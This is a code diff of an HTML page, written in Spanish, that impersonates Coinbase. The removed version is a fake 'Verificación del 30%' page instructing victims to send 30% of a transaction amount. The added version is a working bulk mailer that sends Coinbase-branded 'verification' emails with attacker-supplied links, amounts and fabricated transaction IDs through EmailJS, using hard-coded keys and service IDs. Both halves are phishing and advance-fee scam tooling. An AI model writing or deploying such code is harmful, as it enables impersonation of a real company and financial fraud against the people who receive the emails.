@@ -3,60 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación del 30% - Coinbase Wallet</title>
+    <title>Enviador de Verificaciones</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
     <style>
-        /* Estilos anteriores... */
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; padding: 20px; }
+        .container { max-width: 600px; background: white; margin: 0 auto; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #1a1a1a; font-weight: 600; }
+        input, button { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
+        button { background-color: #1652f0; color: white; border: none; cursor: pointer; transition: background 0.3s; }
+        button:hover { background-color: #1346d0; }
+        #status { margin-top: 15px; padding: 12px; border-radius: 6px; text-align: center; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <img src="https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png" alt="Coinbase Logo">
-        </div>
+        <h2>Enviador de Verificaciones Coinbase</h2>
+        
+        <form id="emailForm">
+            <div class="form-group">
+                <label>Correos destinatarios (separar por comas):</label>
+                <input type="text" id="recipients" placeholder="ejemplo1@dominio.com, ejemplo2@dominio.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Monto en Euros:</label>
+                <input type="number" id="amount" step="0.01" min="0.01" placeholder="Ej: 20000.50" required>
+            </div>
 
-        <h2>Verificación del 30% Requerida</h2>
+            <div class="form-group">
+                <label>Enlace de Verificación:</label>
+                <input type="url" id="verificationLink" placeholder="https://tu-dominio.com/verificacion" required>
+            </div>
 
-        <p>Estimado usuario,</p>
+            <div class="form-group">
+                <label>Enlace de Soporte:</label>
+                <input type="url" id="supportLink" placeholder="https://help.coinbase.com/es" required>
+            </div>
 
-        <p>Para completar la verificación de su transacción, debe enviar el <strong>30% del monto total</strong> a su cuenta personal de Coinbase Wallet. Este paso es necesario para confirmar la legitimidad de la transacción.</p>
+            <div class="form-group">
+                <label>Política de Privacidad:</label>
+                <input type="url" id="privacyPolicy" placeholder="https://www.coinbase.com/es-es/legal/privacy" required>
+            </div>
 
-        <div class="verification-steps">
-            <p><strong>Monto total de la transacción:</strong> <span id="totalAmount"></span></p>
-            <p><strong>30% del monto a enviar:</strong> <span id="verificationAmount"></span></p>
-        </div>
-
-        <p>Por favor, siga estos pasos:</p>
-        <ol>
-            <li>Abra su aplicación Coinbase Wallet.</li>
-            <li>Envié el <strong>30% del monto</strong> a la dirección de su cuenta personal.</li>
-            <li>Confirme la transacción en su billetera.</li>
-        </ol>
-
-        <div class="highlight">
-            <p>Una vez completado, su transacción será verificada automáticamente en un plazo de 24 horas.</p>
-        </div>
-
-        <a href="#" class="button">He completado el envío</a>
-
-        <div class="footer">
-            <p>Si tiene alguna duda, contacte a nuestro <a href="{{{support_link}}}">equipo de soporte</a>.</p>
-        </div>
+            <button type="submit">Enviar Verificaciones</button>
+        </form>
+        
+        <div id="status"></div>
     </div>
 
     <script>
-        // Obtener el monto de la URL (pasado desde la página anterior)
-        const urlParams = new URLSearchParams(window.location.search);
-        const amount = parseFloat(urlParams.get('amount'));
+        emailjs.init('E_jV5FTI4JisVwIlW');
 
-        // Mostrar el monto total y el 30%
-        if (amount && !isNaN(amount)) {
-            document.getElementById('totalAmount').textContent = `${amount.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
-            const verificationAmount = amount * 0.3;
-            document.getElementById('verificationAmount').textContent = `${verificationAmount.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
-        } else {
-            document.getElementById('totalAmount').textContent = 'Monto no disponible';
-            document.getElementById('verificationAmount').textContent = 'Monto no disponible';
-        }
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const recipients = document.getElementById('recipients').value.split(',').map(email => email.trim());
+            const amount = parseFloat(document.getElementById('amount').value);
+            const verificationLink = document.getElementById('verificationLink').value;
+            const supportLink = document.getElementById('supportLink').value;
+            const privacyPolicy = document.getElementById('privacyPolicy').value;
+            
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = '🚀 Iniciando envío de verificaciones...';
+            statusElement.style.background = '#e8f4ff';
+            statusElement.style.color = '#1652f0';
+
+            let successCount = 0;
+            let errorCount = 0;
+
+            const sendNextEmail = (index) => {
+                if (index >= recipients.length) {
+                    statusElement.innerHTML = `
+                        ✅ ${successCount} correos enviados exitosamente<br>
+                        ❌ ${errorCount} errores de envío
+                    `;
+                    return;
+                }
+
+                const templateParams = {
+                    to_email: recipients[index],
+                    amount: `€ ${amount.toLocaleString('es-ES', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
+                    verification_link: verificationLink,
+                    support_link: supportLink,
+                    privacy_policy: privacyPolicy,
+                    transaction_id: `CB${Date.now()}${Math.floor(Math.random() * 1000)}`
+                };
+
+                emailjs.send('service_8kzc798', 'template_woxom1z', templateParams)
+                    .then(() => {
+                        successCount++;
+                        statusElement.innerHTML += `<br>✔️ Enviado a: ${recipients[index]}`;
+                    })
+                    .catch((error) => {
+                        errorCount++;
+                        statusElement.innerHTML += `<br>❌ Error con: ${recipients[index]} (${error.text})`;
+                    })
+                    .finally(() => {
+                        sendNextEmail(index + 1);
+                    });
+            };
+
+            sendNextEmail(0);
+        });
     </script>
 </body>
 </html>
